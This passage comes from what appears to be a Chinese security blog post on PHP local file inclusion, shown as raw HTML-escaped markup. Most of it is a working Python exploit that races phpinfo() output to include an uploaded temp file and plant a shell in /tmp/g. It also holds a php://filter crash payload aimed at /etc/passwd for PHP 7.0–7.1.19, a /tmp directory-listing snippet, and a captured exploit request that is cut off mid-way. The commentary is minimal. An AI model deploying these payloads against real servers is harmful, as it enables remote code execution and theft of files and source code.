&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s2.send(lfireq % (fn, host))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d = s2.recv(&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s2.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; d.find(tag) != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; fn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;counter = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ThreadWorker&lt;/span&gt;(threading.Thread):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, e, l, m, *args&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        threading.Thread.__init__(self)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.event = e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.lock = l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.maxattempts = m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.args = args&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;run&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; counter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; self.event.is_set():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; self.lock:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; counter &amp;gt;= self.maxattempts:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                counter += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x = phpInfoLFI(*self.args)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; self.event.is_set():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\nGot it! Shell created in /tmp/g&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    self.event.&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; socket.error:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getOffset&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;host, port, phpinforeq&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;Gets offset of tmp_name in the php output&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.connect((host, port))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.send(phpinforeq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i = s.recv(&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        d += i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i == &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# detect the final chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i.endswith(&lt;span class=&#34;string&#34;&gt;&amp;quot;0\r\n\r\n&amp;quot;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = d.find(&lt;span class=&#34;string&#34;&gt;&amp;quot;[tmp_name] =&amp;amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i == -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; ValueError(&lt;span class=&#34;string&#34;&gt;&amp;quot;No php tmp_name in phpinfo output&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;found %s at %i&amp;quot;&lt;/span&gt; % (d[i:i + &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;], i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# padded up a bit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; i + &lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;LFI With PHPInfo()&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;-=&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(sys.argv) &amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Usage: %s host [port] [threads]&amp;quot;&lt;/span&gt; % sys.argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        host = socket.gethostbyname(sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; socket.error, e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Error with hostname %s: %s&amp;quot;&lt;/span&gt; % (sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], e)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    port = &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        port = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(sys.argv[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; IndexError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; ValueError, e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Error with port %d: %s&amp;quot;&lt;/span&gt; % (sys.argv[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;], e)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    poolsz = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        poolsz = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(sys.argv[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; IndexError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; ValueError, e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Error with poolsz %d: %s&amp;quot;&lt;/span&gt; % (sys.argv[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;], e)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Getting initial offset...&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    reqphp, tag, reqlfi = setup(host, port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    offset = getOffset(host, port, reqphp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    maxattempts = &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    e = threading.Event()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    l = threading.Lock()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Spawning worker pool (%d)...&amp;quot;&lt;/span&gt; % poolsz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tp = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, poolsz):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; t &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; tp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; e.wait(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; e.is_set():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; l:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sys.stdout.write(&lt;span class=&#34;string&#34;&gt;&amp;quot;\r% 4d / % 4d&amp;quot;&lt;/span&gt; % (counter, maxattempts))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                sys.stdout.flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; counter &amp;gt;= maxattempts:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; e.is_set():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Woot!  \m/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;:(&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\nTelling threads to shutdown...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        e.&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Shuttin&amp;#x27; down...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; t &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; tp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.join()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;lfiphp7-collapse&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfiphp7-collapse&#34;&gt;#&lt;/a&gt; LFI+php7 collapse&lt;/h2&gt;
&lt;p&gt;php 7.0-7.1.19&lt;/p&gt;
&lt;p&gt;当不存在 phpinfo 时，可以利用 php7 的特性&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd&lt;/code&gt;  导致 php 崩溃，临时文件遗留了下来&lt;/p&gt;
&lt;p&gt;在上传时抓包，使用以上 payload 进行崩溃&lt;/p&gt;
&lt;p&gt;接下来需要找到刚刚的临时文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = @$_GET[&amp;#x27;dir&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(!$a)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = &amp;#x27;/tmp&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump(scandir($a));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后写 shell 包含随便搞&lt;/p&gt;
&lt;p&gt;两种崩溃方法：&lt;/p&gt;
&lt;p&gt;抓包时修改&lt;/p&gt;
&lt;p&gt;先写个文件上传页面，上传时抓包，修改 url 和文件内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /upload_file.php?file=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua: &amp;quot;Chromium&amp;quot;;v=&amp;quot;97&amp;quot;, &amp;quot; Not;A Brand&amp;quot;;v=&amp;quot;99&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua-mobile: ?0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec-ch-ua-platform: &amp;quot;Windows&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Origin: http://127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6O4h5F4Qzy538QaC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: 